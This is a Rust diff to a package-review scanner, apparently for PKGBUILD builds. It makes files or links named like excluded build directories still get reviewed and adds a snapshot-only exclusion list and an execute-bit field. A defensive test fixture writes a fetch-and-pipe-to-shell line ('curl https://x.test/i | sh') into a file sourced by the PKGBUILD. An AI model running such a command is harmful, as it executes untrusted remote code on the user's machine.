@@ -63,8 +63,13 @@ const O_NONBLOCK: i32 = 0o4000;
 pub struct ScanConfig {
     pub root: PathBuf,
     pub include_ignored_dirs: bool,
-    /// Top-level directory names left out of both the review and the snapshot.
+    /// Top-level directory names left out of both the review and the
+    /// snapshot. A file or link of such a name is reviewed like any other:
+    /// only a directory is something a build tool made.
     pub excluded_top_level: Vec<String>,
+    /// Top-level names left out whatever they are. For comparing snapshots
+    /// (what makepkg downloaded since), never for a review.
+    pub excluded_entries: Vec<String>,
     pub limits: Limits,
 }
 
@@ -74,20 +79,21 @@ impl ScanConfig {
             root: root.into(),
             include_ignored_dirs: false,
             excluded_top_level: Vec::new(),
+            excluded_entries: Vec::new(),
             limits: Limits::DEFAULT,
         }
     }
 
-    /// Names left out of the walk. `.git` is walked separately (see
-    /// `Walker::git_directory`).
-    fn skips(&self, name: &str, top_level: bool) -> bool {
+    /// Names left out of the walk; `path` is the entry itself. `.git` is
+    /// walked separately (see `Walker::git_directory`).
+    fn skips(&self, name: &str, top_level: bool, path: &Path) -> bool {
+        let named = |names: &[String]| names.iter().any(|excluded| excluded == name);
         name == ".git"
             || (top_level
                 && (self.is_generated(name)
-                    || self
-                        .excluded_top_level
-                        .iter()
-                        .any(|excluded| excluded == name)))
+                    || named(&self.excluded_entries)
+                    || (named(&self.excluded_top_level)
+                        && fs::symlink_metadata(path).is_ok_and(|metadata| metadata.is_dir()))))
     }
 
     /// A top-level generated directory this scan skips.
@@ -139,6 +145,8 @@ pub struct FileHash {
     pub lossy: bool,
     /// Size in bytes.
     pub bytes: u64,
+    /// The execute bit.
+    pub executable: bool,
 }
 
 /// The files of a tree, sorted by path.
@@ -325,6 +333,7 @@ impl Walker<'_> {
                     format: None,
                     lossy: false,
                     bytes: 0,
+                    executable: false,
                 });
             }
             Some(_) | None => self.gaps.push(Gap::Symlink(logical.display().to_string())),
@@ -365,7 +374,7 @@ impl Walker<'_> {
 
         let mut path = self.config.root.clone();
         for (index, name) in resolved.iter().enumerate() {
-            if self.config.skips(name, index == 0) {
+            if self.config.skips(name, index == 0, &path.join(name)) {
                 return false;
             }
             path.push(name);
@@ -420,7 +429,10 @@ impl Walker<'_> {
                 });
                 continue;
             }
-            if self.config.skips(name_text, rel.is_empty()) {
+            if self
+                .config
+                .skips(name_text, rel.is_empty(), &handle.join(&name))
+            {
                 continue;
             }
             self.entry(&handle.join(&name), &child_logical, child_rel);
@@ -560,6 +572,7 @@ impl Walker<'_> {
             format,
             lossy,
             bytes: metadata.len(),
+            executable,
         });
     }
 }
@@ -785,6 +798,30 @@ mod tests {
         let mut config = ScanConfig::new(dir.path());
         config.excluded_top_level = vec!["src".to_string()];
         assert_eq!(walk_texts(&config).0, ["PKGBUILD", "lib/src/b.c"]);
+    }
+
+    #[test]
+    fn a_file_named_like_an_excluded_directory_is_reviewed() {
+        let dir = TempDir::new("excluded-file");
+        fs::write(dir.path().join("src"), "curl https://x.test/i | sh\n").unwrap();
+        symlink("src", dir.path().join("pkg")).unwrap();
+        fs::write(dir.path().join("PKGBUILD"), ". ./src\n").unwrap();
+
+        let mut config = ScanConfig::new(dir.path());
+        config.excluded_top_level = vec!["src".to_string(), "pkg".to_string()];
+        let (texts, snapshot, gaps) = walk_texts(&config);
+        assert_eq!(texts, ["PKGBUILD", "src"]);
+        assert!(gaps.is_empty(), "{gaps:?}");
+        let paths: Vec<&str> = snapshot
+            .files()
+            .iter()
+            .map(|file| file.path.as_str())
+            .collect();
+        assert_eq!(paths, ["PKGBUILD", "pkg", "src"]);
+
+        // What a snapshot comparison leaves out is left out whatever it is.
+        config.excluded_entries = vec!["src".to_string()];
+        assert_eq!(walk_texts(&config).0, ["PKGBUILD"]);
     }
 
     #[test]
